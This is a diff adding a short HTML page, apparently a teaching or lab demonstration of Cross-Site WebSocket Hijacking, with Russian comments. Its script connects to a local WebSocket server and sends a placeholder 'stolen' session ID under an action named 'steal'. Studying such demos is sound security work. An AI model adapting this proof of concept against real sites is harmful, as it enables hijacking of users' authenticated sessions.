@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSWSH Example</title>
+</head>
+<body>
+<script>
+    // Создание WebSocket-соединения с использованием учетных данных жертвы
+    var ws = new WebSocket('ws://localhost:8080');
+
+    ws.onopen = function() {
+        // Имитируем получение sessionId из другого источника (например, через XSS или утечку)
+        var stolenSessionId = 'example_session_id'; // Это должно быть украдено, здесь для демонстрации
+
+        // Отправка команды на сервер от имени жертвы
+        ws.send(JSON.stringify({"action":"steal","data": stolenSessionId}));
+    };
+
+    ws.onmessage = function(event) {
+        // Обработка ответа сервера
+        console.log('Received:', event.data);
+    };
+</script>
+</body>
+</html>
